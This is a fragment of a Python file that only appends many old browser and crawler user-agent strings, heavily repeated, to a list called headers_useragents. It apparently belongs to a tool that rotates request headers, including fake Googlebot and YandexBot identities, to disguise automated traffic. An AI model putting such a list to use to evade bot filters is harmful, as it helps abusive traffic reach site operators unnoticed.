	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; {1C69E7AA-C14E-200E-5A77-8EAB2D667A07})')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; acc=baadshah; acc=none; freenet DSL 1.1; (none))')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.51')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; snprtz|S26320700000083|2600#Service Pack 1#2#5#154321|isdn)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Alexa Toolbar; mxie; .NET CLR 1.1.4322)')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; ja-jp) AppleWebKit/417.9 (KHTML, like Gecko) Safari/417.8')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12) Gecko/20051010 Firefox/1.0.7 (Ubuntu package 1.0.7)')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
	headers_useragents.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
	headers_useragents.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
	headers_useragents.append('Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
	headers_useragents.append('Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
	headers_useragents.append('Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
	headers_useragents.append('Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
	headers_useragents.append('Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
	headers_useragents.append('Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
	headers_useragents.append('Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
	headers_useragents.append('Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
	headers_useragents.append('BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
	headers_useragents.append('Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
	headers_useragents.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
	headers_useragents.append('BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)')
	headers_useragents.append('Googlebot/2.1 (http://www.googlebot.com/bot.html)')
	headers_useragents.append('Opera/9.20 (Windows NT 6.0; U; en)')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)')
	headers_useragents.append('Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16')
	headers_useragents.append('Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7')
	headers_useragents.append('Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)')
	headers_useragents.append('Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)')
	headers_useragents.append('YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	headers_useragents.append('AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.21; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
	headers_useragents.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
	headers_useragents.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
	headers_useragents.append('Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
	headers_useragents.append('Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
	headers_useragents.append('Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
	headers_useragents.append('Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
	headers_useragents.append('Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
	headers_useragents.append('Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
	headers_useragents.append('Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
	headers_useragents.append('Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
	headers_useragents.append('BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
	headers_useragents.append('Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
	headers_useragents.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
	headers_useragents.append('BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
	headers_useragents.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
	headers_useragents.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
	headers_useragents.append('Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
	headers_useragents.append('Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
	headers_useragents.append('Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
	headers_useragents.append('Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
	headers_useragents.append('Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
	headers_useragents.append('Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
	headers_useragents.append('Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
	headers_useragents.append('Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
	headers_useragents.append('BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
	headers_useragents.append('Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
	headers_useragents.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
